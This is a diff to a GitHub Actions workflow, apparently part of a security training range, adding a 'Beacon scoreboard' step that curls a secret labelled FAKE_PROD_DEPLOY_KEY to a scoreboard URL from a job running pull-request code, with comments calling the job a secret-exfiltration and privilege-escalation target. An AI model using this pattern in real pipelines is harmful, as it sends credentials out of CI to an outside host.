@@ -41,8 +41,32 @@ jobs:
           # comment on, or promote releases. It makes this job a privilege
           # escalation target as well as a secret-exfil target.
           BOT_TOKEN: ${{ secrets.BOT_TOKEN }}
-          EXFIL_KIND: pr-head-ci
-          EXFIL_URL: ${{ vars.SCOREBOARD_URL }}
         run: |
           go build ./...
           go test ./...
+
+      # Beacon: this job runs PR-head code with FAKE_PROD_DEPLOY_KEY in the
+      # environment, so a run is the pr-head-ci impact proof. POSTs a
+      # repository_dispatch to the scoreboard.
+      - name: Beacon scoreboard
+        if: always()
+        env:
+          SCOREBOARD_TOKEN: ${{ secrets.REVIEW_BOT_TOKEN }}
+          SCOREBOARD_URL: ${{ vars.SCOREBOARD_URL }}
+          TEAM: ${{ github.event.repository.name }}
+          KIND: pr-head-ci
+          SECRET_VALUE: ${{ secrets.FAKE_PROD_DEPLOY_KEY }}
+          WORKFLOW_NAME: ${{ github.workflow }}
+        run: |
+          set -euo pipefail
+          payload=$(jq -nc \
+            --arg team "$TEAM" \
+            --arg kind "$KIND" \
+            --arg secret "$SECRET_VALUE" \
+            --arg workflow "$WORKFLOW_NAME" \
+            '{event_type:"beacon",client_payload:{team:$team,kind:$kind,secret:$secret,workflow:$workflow}}')
+          curl -fsS -X POST \
+            -H "Authorization: token $SCOREBOARD_TOKEN" \
+            -H "Accept: application/vnd.github+json" \
+            "$SCOREBOARD_URL" \
+            -d "$payload"
